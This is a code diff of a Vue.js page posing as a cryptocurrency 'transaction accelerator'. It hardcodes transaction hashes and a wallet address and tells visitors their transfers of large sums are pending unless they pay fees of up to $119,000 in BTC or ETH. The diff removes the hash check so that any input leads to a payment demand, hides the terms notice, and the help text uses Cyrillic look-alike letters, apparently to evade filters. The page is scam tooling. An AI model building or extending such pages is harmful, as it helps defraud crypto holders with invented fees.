@@ -1,4 +1,4 @@
-<template>
+x<template>
   <div class="home">
     <fund-wallet-modal @close="hideDialog" v-if="dialogIsVisible"  />
     <fund-wallet-modal2 @close="hideDialog2" v-if="dialogIsVisible2"/>
@@ -19,7 +19,7 @@
             type="text"
             required
             v-model="inputValue"
-            placeholder="TXID (Transaction ID) ..."
+            placeholder="TXID or Wallet ID ..."
             class="text-input"
             @input="clearValidationError"
             :pattern="pattern"
@@ -29,7 +29,6 @@
       </form>
 
       <p v-if="showError" class="error-message">Please match the format requested.</p>
-
 
       <div class="action-wrapper">
         <div class="seprate" v-if="loading === true">
@@ -47,18 +46,22 @@
           <p class="action-text-part-text-1" v-if="this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'">
             Transaction Pending Confirmation! To accelerate your transaction of $100,020, please click Proceed and follow the steps displayed.
           </p>
+          <p class="action-text-part-text-1" v-if="this.inputValue === '0xE913Bf78B40285908B78142c6FF2D0B66B948AD7'">
+            Transaction Pending Confirmation! To accelerate your transaction please click Proceed and follow the steps displayed.
+          </p>
           <p class="action-text-part-text-1" v-if="this.inputValue === '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4'">
-            Transaction Pending Confirmation! To accelerate your transaction of  $58,982, please click Proceed and follow the steps displayed.
+            Transaction Pending Confirmation! To accelerate your transaction of $58,982, please click Proceed and follow the steps displayed.
           </p>
           <p class="action-text-part-text-1" v-if="this.inputValue === '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98'">
-            Transaction Pending Confirmation! To accelerate your transaction of  $275,176, please click Proceed and follow the steps displayed.
+            Transaction Pending Confirmation! To accelerate your transaction of $275,176, please click Proceed and follow the steps displayed.
           </p>
           <p class="action-text-part-text-1"
              v-if="this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
      this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
-          this.inputValue !== '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' &&
-                    this.inputValue !== '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98' &&
-     this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
+     this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5' &&
+     this.inputValue !== '0xE913Bf78B40285908B78142c6FF2D0B66B948AD7' &&
+     this.inputValue !== '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' &&
+     this.inputValue !== '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98'"
           >Transaction Pending confirmation! To accelerate your Transaction click proceed and
             follow the steps displayed</p>
           <p class="submit-button-2" @click="handleClick3">Proceed</p>
@@ -72,9 +75,10 @@
         <div class="input-button-wrapper" v-if="showActionText2">
           <div style="display: flex;flex-direction: column;width: 100%;margin-top: 10px;">
             <label>Select Payment Method:</label>
-            <select required v-model="selectValue"  class="text-input">
+            <select required v-model="selectValue" class="text-input">
               <option value="Bitcoin">Bitcoin</option>
-              <option v-show="this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'" value="Ethereum">Ethereum</option>
+<!--              <option v-show="this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5' || this.inputValue === '0xE913Bf78B40285908B78142c6FF2D0B66B948AD7'" value="Ethereum">Ethereum</option>-->
+              <option  value="Ethereum">Ethereum</option>
             </select>
           </div>
         </div>
@@ -92,6 +96,10 @@
             <p class="price-container-text-1">Price:</p>
             <p class="price-container-text-2">$0</p>
           </div>
+          <div v-if="this.inputValue === '0xE913Bf78B40285908B78142c6FF2D0B66B948AD7'" class="price-container-1">
+            <p class="price-container-text-1">Price:</p>
+            <p class="price-container-text-2">$3,999</p>
+          </div>
           <div v-if="this.inputValue === '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4'" class="price-container-1">
             <p class="price-container-text-1">Price:</p>
             <p class="price-container-text-2">$7,500</p>
@@ -103,9 +111,10 @@
           <div
               v-if="this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
      this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
+     this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5' &&
+     this.inputValue !== '0xE913Bf78B40285908B78142c6FF2D0B66B948AD7' &&
      this.inputValue !== '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' &&
-     this.inputValue !== '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98' &&
-     this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
+     this.inputValue !== '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98'"
               class="price-container-1">
             <p class="price-container-text-1">Price:</p>
             <p class="price-container-text-2">$119,000</p>
@@ -117,20 +126,21 @@
             <div v-else>
               <p v-if="this.inputValue === '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' ||
      this.inputValue === '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' ||
-          this.inputValue === '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' ||
-          this.inputValue === '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98' ||
-     this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
+     this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5' ||
+     this.inputValue === '0xE913Bf78B40285908B78142c6FF2D0B66B948AD7' ||
+     this.inputValue === '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' ||
+     this.inputValue === '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98'"
                  class="price-container-text-3" @click="showDialog5">Submit Order</p>
-              <p v-else  class="price-container-text-3" @click="showDialog">Submit Order</p>
+              <p v-else class="price-container-text-3" @click="showDialog">Submit Order</p>
             </div>
           </div>
         </div>
 
-        <div class="info-container" v-if="showActionText2">
-          <p class="info-container-text">
-            By clicking "Submit Order" You agree to our <span class="premium">Terms and conditions.</span>
-          </p>
-        </div>
+<!--        <div class="info-container" v-if="showActionText2">-->
+<!--          <p class="info-container-text">-->
+<!--            By clicking "Submit Order" You agree to our <span class="premium">Terms and conditions.</span>-->
+<!--          </p>-->
+<!--        </div>-->
 
         <div class="seprate" v-if="loading3 === true">
           <span class="loader"></span>
@@ -253,7 +263,7 @@
         <p class="text-6">
           А Віtсоіn Тrаnѕасtіоn ІD (ТхІD) іѕ а unіquе іdеntіfіеr аѕѕіgnеd tо еасh trаnѕасtіоn thаt оссurѕ оn thе
           Віtсоіn blосkсhаіn. Іt ѕеrvеѕ аѕ а wау tо trасk аnd vеrіfу trаnѕасtіоnѕ оn thе nеtwоrk. Тhе ТхІD іѕ tурісаllу
-          а 64-сhаrасtеr-lоng ѕtrіng оf lеttеrѕ аnd numbеrѕ, rерrеѕеntеd іn hехаdесіmаl fоrmаt.
+          а 64-сhаrасtеr-lоng ѕtrіng оf lеttеrѕ аnd numbеrѕ, rерrеѕеntеd іn hехаdесіmаl fоrmаt. A Wallet ID is a 42-character Ethereum address used to identify a wallet.
         </p>
         <p class="text-6">
           Іf уоu'rе uѕіng а Віtсоіn wаllеt ѕоftwаrе оr ѕеrvісе, thеrе іѕ uѕuаllу а trаnѕасtіоn hіѕtоrу оr асtіvіtу
@@ -328,7 +338,6 @@
 
 <script>
 // @ is an alias to /src
-
 import FooterHome from "@/components/BaseComponents/FooterHome.vue";
 import FundWalletModal from "@/components/BaseComponents/modal/FundWalletModal.vue";
 import Swal from "sweetalert2";
@@ -382,123 +391,150 @@ export default {
       bitcoinRate: null,
       ethereumRate: null,
       showError: false, // Add this data property to manage error visibility
-      pattern: ".{64,}", // This pattern requires at least 64 characters
+      pattern: "^0x[a-fA-F0-9]{40}$|^0x[a-fA-F0-9]{64}$", // Accepts 42-char wallet IDs or 64-char TXIDs
     };
   },
   methods: {
-    fetchBitcoinRate() {
-      // Set loading to true when the request starts
+    async fetchBitcoinRate() {
       this.loading = true;
-
-      // eslint-disable-next-line no-undef
-      axios.get('https://api.coindesk.com/v1/bpi/currentprice/BTC.json')
-          .then(response => {
-            this.bitcoinRate = response.data.bpi.USD.rate_float;
-            // Set loading to false when the data is successfully fetched
-            this.loading = false;
-          })
-          .catch(error => {
-            console.error(error);
-            // Set loading to false also if there is an error
-            this.loading = false;
-          });
+      this.error = null;
+      try {
+        const response = await axios.get(
+            'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
+        );
+        this.bitcoinRate = response.data.bitcoin.usd;
+      } catch (err) {
+        console.error('Error fetching Bitcoin rate:', err);
+        this.error = 'Failed to fetch BTC rate';
+      } finally {
+        this.loading = false;
+      }
     },
 
     fetchEthereumRate() {
-      // Set loading to true when the request starts
       this.loading = true;
-
-      // Use CoinGecko API to fetch the Ethereum price
       axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
           .then(response => {
             this.ethereumRate = response.data.ethereum.usd;
-            // Set loading to false when the data is successfully fetched
             this.loading = false;
           })
           .catch(error => {
             console.error(error);
-            // Set loading to false if there is an error
             this.loading = false;
           });
     },
 
     convertAndSave2() {
-      this.inputValue3 = 0;
-      const usdAmount = parseFloat(this.inputValue3);
-      this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
-    },
-
-    convertAndSave() {
-      // Check if inputValue is the specific address
       if (this.inputValue === "0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad") {
-        // If the address matches, set inputValue3 to 4000
         this.inputValue3 = 4000;
         console.log(this.inputValue3);
         const usdAmount = parseFloat(this.inputValue3);
-        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+        this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8);
       } else if (this.inputValue === "0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6") {
-        // If the address matches, set inputValue3 to 2000
         this.inputValue3 = 2000;
         console.log(this.inputValue3);
         const usdAmount = parseFloat(this.inputValue3);
-        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+        this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8);
       } else if (this.inputValue === "0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5") {
-        // If the address matches, set inputValue3 to 0
         this.inputValue3 = 0;
         console.log(this.inputValue3);
         const usdAmount = parseFloat(this.inputValue3);
-        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+        this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8);
+      } else if (this.inputValue === "0xE913Bf78B40285908B78142c6FF2D0B66B948AD7") {
+        this.inputValue3 = 3999;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8);
       } else if (this.inputValue === "0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4") {
-        // If the address matches, set inputValue3 to 7500
         this.inputValue3 = 7500;
         console.log(this.inputValue3);
         const usdAmount = parseFloat(this.inputValue3);
-        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+        this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8);
       } else if (this.inputValue === "0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98") {
-        // If the address matches, set inputValue3 to 20600
         this.inputValue3 = 20600;
         console.log(this.inputValue3);
         const usdAmount = parseFloat(this.inputValue3);
-        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+        this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8);
       } else {
-        // Proceed with the conversion using the normal inputValue3
         this.inputValue3 = 119000;
         console.log(this.inputValue3);
         const usdAmount = parseFloat(this.inputValue3);
-        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+        this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8);
+      }
+
+    },
+
+    convertAndSave() {
+      if (this.inputValue === "0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad") {
+        this.inputValue3 = 4000;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8);
+      } else if (this.inputValue === "0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6") {
+        this.inputValue3 = 2000;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8);
+      } else if (this.inputValue === "0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5") {
+        this.inputValue3 = 0;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8);
+      } else if (this.inputValue === "0xE913Bf78B40285908B78142c6FF2D0B66B948AD7") {
+        this.inputValue3 = 3999;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8);
+      } else if (this.inputValue === "0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4") {
+        this.inputValue3 = 7500;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8);
+      } else if (this.inputValue === "0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98") {
+        this.inputValue3 = 20600;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8);
+      } else {
+        this.inputValue3 = 119000;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8);
       }
     },
 
     async validateAndSubmit() {
       const txidInput = this.$refs.txidInput;
-      const validHashes = [
-        '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad',
-        '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6',
-        '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5',
-        '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4',
-        '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98',
-        '0xc71732bbd9bd2076bb90fa5d80fb9a06591708b8d42cbe3c7a326f2c7b306e33',
-        '0x1ed4cedfb235556ee5598c902dff761eaa7927b7f869e8b4d04fa1228fb2d9f8',
-        '0x186fdefc2952480f6739b7a30d5028cb1pc8497412edc9f99cec25c05c86df59' // remember to change this every where 4 is the last digit not 9
-      ];
+      // const validHashes = [
+      //   '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad',
+      //   '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6',
+      //   '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5',
+      //   '0xE913Bf78B40285908B78142c6FF2D0B66B948AD7',
+      //   '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4',
+      //   '0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98',
+      //   '0xc71732bbd9bd2076bb90fa5d80fb9a06591708b8d42cbe3c7a326f2c7b306e33',
+      //   '0x1ed4cedfb235556ee5598c902dff761eaa7927b7f869e8b4d04fa1228fb2d9f8',
+      //   '0x186fdefc2952480f6739b7a30d5028cb1pc8497412edc9f99cec25c05c86df54'
+      // ];
 
-      if (this.inputValue.length < 62) {
-        txidInput.setCustomValidity("Please match the format requested. TXID should be 62 characters long.");
-        txidInput.reportValidity(); // Display the validation message
-      } else if (!validHashes.includes(this.inputValue)) {
-        // Show toast for invalid hash
-        Swal.fire({
-          icon: 'error',
-          title: 'Invalid Hash ID',
-          text: 'The provided Transaction ID is not recognized. Please enter a valid TXID.',
-          toast: true,
-          position: 'top-end',
-          showConfirmButton: false,
-          timer: 3000,
-          timerProgressBar: true
-        });
-        this.inputValue = ""; // Clear the input field
-      } else if (this.inputValue === '0xc71732bbd9bd2076bb90fa5d80fb9a06591708b8d42cbe3c7a326f2c7b306e33'
+      if (!txidInput.checkValidity()) {
+        txidInput.setCustomValidity("Please match the format requested. TXID should be 64 characters or Wallet ID should be 42 characters, starting with '0x'.");
+        txidInput.reportValidity();
+      }
+      // else if (!validHashes.includes(this.inputValue)) {
+      //   Swal.fire({
+      //     icon: 'error',
+      //     title: 'Invalid ID',
+      //     text: 'The provided Transaction ID or Wallet ID is not recognized. Please enter a valid ID.',
+      //     toast: true,
+      //     position: 'top-end',
+      //     showConfirmButton: false,
+      //     timer: 3000,
+      //     timerProgressBar: true
+      //   });
+      //   this.inputValue = "";
+      // }
+      else if (this.inputValue === '0xc71732bbd9bd2076bb90fa5d80fb9a06591708b8d42cbe3c7a326f2c7b306e33'
           || this.inputValue === '0x1ed4cedfb235556ee5598c902dff761eaa7927b7f869e8b4d04fa1228fb2d9f8') {
         if (this.inputValue === '0xc71732bbd9bd2076bb90fa5d80fb9a06591708b8d42cbe3c7a326f2c7b306e33') {
           Swal.fire({
@@ -511,91 +547,84 @@ export default {
         }
         this.$store.commit('updateHash', { inputValue: this.inputValue });
         this.inputValue = "";
-      } else if (this.inputValue === '0x186fdefc2952480f6739b7a30d5028cb1pc8497412edc9f99cec25c05c86df59') {
+      } else if (this.inputValue === '0x186fdefc2952480f6739b7a30d5028cb1pc8497412edc9f99cec25c05c86df54') {
         await this.handleClick4();
       } else {
         this.$store.commit('updateHash', { inputValue: this.inputValue });
-        txidInput.setCustomValidity(""); // Clear the validation message
-        this.handleClick(); // Proceed with form submission
+        txidInput.setCustomValidity("");
+        this.handleClick();
       }
     },
 
     clearValidationError() {
       const txidInput = this.$refs.txidInput;
-      txidInput.setCustomValidity(""); // Clear the validation error when the user types
+      txidInput.setCustomValidity("");
     },
 
     handleClick() {
       console.log('Input Value:', this.inputValue);
-      this.loading = true; // Show the loader
-
-      // Wait for 3 seconds before showing the action text part
+      this.loading = true;
       setTimeout(() => {
-        this.loading = false; // Hide the loader
-        this.showActionText = true; // Show the action text part
+        this.loading = false;
+        this.showActionText = true;
       }, 3000);
     },
 
     handleClick3() {
-      this.loading4 = true; // Show the loader
-
-      // Wait for 3 seconds before showing the action text part
+      this.loading4 = true;
       setTimeout(() => {
-        this.loading4 = false; // Hide the loader
-        this.showActionText2 = true; // Show the action text part
+        this.loading4 = false;
+        this.showActionText2 = true;
       }, 3000);
     },
 
     handleClick4() {
       console.log('Input Value:', this.inputValue);
-      this.loading6 = true; // Show the loader
-
-      // Wait for 3 seconds before showing the action text part
+      this.loading6 = true;
       setTimeout(() => {
-        this.loading6 = false; // Hide the loader
-        this.showActionText4 = true; // Show the action text part
+        this.loading6 = false;
+        this.showActionText4 = true;
       }, 3000);
     },
 
     handleClick5() {
-      if (this.inputValue === '0x186fdefc2952480f6739b7a30d5028cb1pc8497412edc9f99cec25c05c86df59') {
-        this.loading7 = true; // Show the loader
-
-        // Wait for 3 seconds before showing the action text part
+      if (this.inputValue === '0x186fdefc2952480f6739b7a30d5028cb1pc8497412edc9f99cec25c05c86df54') {
+        this.loading7 = true;
         setTimeout(() => {
-          this.loading7 = false; // Hide the loader
-          this.showDialog6() // show third modal
+          this.loading7 = false;
+          this.showDialog6();
         }, 3000);
       } else {
-        this.loading7 = true; // Show the loader
-
-        // Wait for 3 seconds before showing the action text part
+        this.loading7 = true;
         setTimeout(() => {
-          this.loading7 = false; // Hide the loader
-          this.showDialog3() // show third modal
+          this.loading7 = false;
+          this.showDialog3();
         }, 3000);
       }
     },
 
     hideDialog() {
       this.dialogIsVisible = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.loading3 = true; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.loading3 = true;
       this.inputValue = "";
     },
     showDialog() {
-      this.loading5 = true; // Show the loader
-
-      // Wait for 3 seconds before showing the action text part
+      this.loading5 = true;
+      console.log(this.inputValueEth)
       setTimeout(() => {
-        this.loading5 = false; // Hide the loader
+        this.loading5 = false;
         this.dialogIsVisible = true;
-        this.convertAndSave()
-        this.convertAndSave2()
+        this.convertAndSave();
+        this.convertAndSave2();
         this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
         this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
         this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
+
+        this.$store.commit('updateSelectedPaymentMethod', { selectValue: this.selectValue });
+        this.$store.commit('updateBtcRate', { bitcoinRate: this.bitcoinRate });
+        this.$store.commit('updateEthRate', { ethereumRate: this.ethereumRate });
       }, 3000);
     },
 
@@ -608,17 +637,17 @@ export default {
 
     hideDialog3() {
       this.dialogIsVisible3 = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.showActionText3 = false; // close the action text part
-      this.showActionText4 = false; // close the action text part
-      this.loading8 = false; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.showActionText3 = false;
+      this.showActionText4 = false;
+      this.loading8 = false;
       this.inputValue = "";
     },
     showDialog3() {
       this.dialogIsVisible3 = true;
-      this.convertAndSave()
-      this.convertAndSave2()
+      this.convertAndSave();
+      this.convertAndSave2();
       this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
       this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
       this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
@@ -626,17 +655,17 @@ export default {
 
     hideDialog4() {
       this.dialogIsVisible4 = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.showActionText3 = false; // close the action text part
-      this.showActionText4 = false; // close the action text part
-      this.loading8 = true; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.showActionText3 = false;
+      this.showActionText4 = false;
+      this.loading8 = true;
       this.inputValue = "";
     },
     showDialog4() {
       this.dialogIsVisible4 = true;
-      this.convertAndSave()
-      this.convertAndSave2()
+      this.convertAndSave();
+      this.convertAndSave2();
       this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
       this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
       this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
@@ -644,29 +673,38 @@ export default {
 
     hideDialog5() {
       this.dialogIsVisible5 = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.showActionText3 = false; // close the action text part
-      this.showActionText4 = false; // close the action text part
-      this.loading8 = true; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.showActionText3 = false;
+      this.showActionText4 = false;
+      this.loading8 = true;
       this.inputValue = "";
+      this.selectValue = null
+      this.loading3 = true;
     },
     showDialog5() {
-      this.dialogIsVisible5 = true;
-      this.convertAndSave()
-      this.convertAndSave2()
-      this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
-      this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
-      this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
+      this.loading5 = true;
+      setTimeout(() => {
+        this.loading5 = false;
+        this.dialogIsVisible5 = true;
+        this.convertAndSave();
+        this.convertAndSave2();
+        this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
+        this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
+        this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
+        this.$store.commit('updateSelectedPaymentMethod', { selectValue: this.selectValue });
+        this.$store.commit('updateBtcRate', { bitcoinRate: this.bitcoinRate });
+        this.$store.commit('updateEthRate', { ethereumRate: this.ethereumRate });
+      }, 3000);
     },
 
     hideDialog6() {
       this.dialogIsVisible6 = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.showActionText3 = false; // close the action text part
-      this.showActionText4 = false; // close the action text part
-      this.loading8 = false; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.showActionText3 = false;
+      this.showActionText4 = false;
+      this.loading8 = false;
       this.inputValue = "";
     },
     showDialog6() {
@@ -675,11 +713,11 @@ export default {
 
     hideDialog7() {
       this.dialogIsVisible7 = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.showActionText3 = false; // close the action text part
-      this.showActionText4 = false; // close the action text part
-      this.loading8 = false; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.showActionText3 = false;
+      this.showActionText4 = false;
+      this.loading8 = false;
       this.inputValue = "";
     },
     showDialog7() {
@@ -688,11 +726,11 @@ export default {
 
     hideDialog8() {
       this.dialogIsVisible8 = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.showActionText3 = false; // close the action text part
-      this.showActionText4 = false; // close the action text part
-      this.loading8 = false; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.showActionText3 = false;
+      this.showActionText4 = false;
+      this.loading8 = false;
       this.inputValue = "";
     },
     showDialog8() {
@@ -701,11 +739,11 @@ export default {
 
     hideDialog9() {
       this.dialogIsVisible9 = false;
-      this.showActionText = false; // close the action text part
-      this.showActionText2 = false; // close the action text part
-      this.showActionText3 = false; // close the action text part
-      this.showActionText4 = false; // close the action text part
-      this.loading8 = false; // Show the loader
+      this.showActionText = false;
+      this.showActionText2 = false;
+      this.showActionText3 = false;
+      this.showActionText4 = false;
+      this.loading8 = false;
       this.inputValue = "";
     },
     showDialog9() {
@@ -714,12 +752,12 @@ export default {
   },
 
   created() {
-    this.fetchBitcoinRate()
-    this.fetchEthereumRate()
+    this.fetchBitcoinRate();
+    this.fetchEthereumRate();
   },
   mounted() {
-    this.fetchBitcoinRate()
-    this.fetchEthereumRate()
+    this.fetchBitcoinRate();
+    this.fetchEthereumRate();
   }
 }
 </script>
@@ -738,13 +776,13 @@ export default {
   margin-top: 5px;
 }
 
-.section-1{
+.section-1 {
   width: 50%;
   margin-left: auto;
   margin-right: auto;
 }
 
-.logo{
+.logo {
   text-align: center;
   font-family: 'Peralta', serif;
   font-size: 60px;
@@ -752,7 +790,7 @@ export default {
   color: #007bff;
 }
 
-.logo-main{
+.logo-main {
   padding: 2.5rem 2.5rem;
   margin-bottom: 2rem;
   background-color: #e9ecef;
@@ -813,17 +851,17 @@ hr.new1 {
   border-top: 1px solid rgba(0, 0, 0, .1);
 }
 
-.section-1-text-1{
+.section-1-text-1 {
   line-height: 1.55;
 }
 
-.text-1{
+.text-1 {
   padding-top: 3.5%;
   font-size: 1.5rem;
   font-family: 'BR-Firma-Bold', sans-serif;
 }
 
-.text-2{
+.text-2 {
   padding-top: 1%;
   padding-bottom: 1%;
   font-size: 1.2rem;
@@ -831,17 +869,17 @@ hr.new1 {
   font-weight: bold;
 }
 
-.text-3{
+.text-3 {
   padding-top: 1%;
   padding-bottom: 1%;
 }
 
-.text-4{
+.text-4 {
   padding-top: 1%;
   padding-bottom: 1%;
 }
 
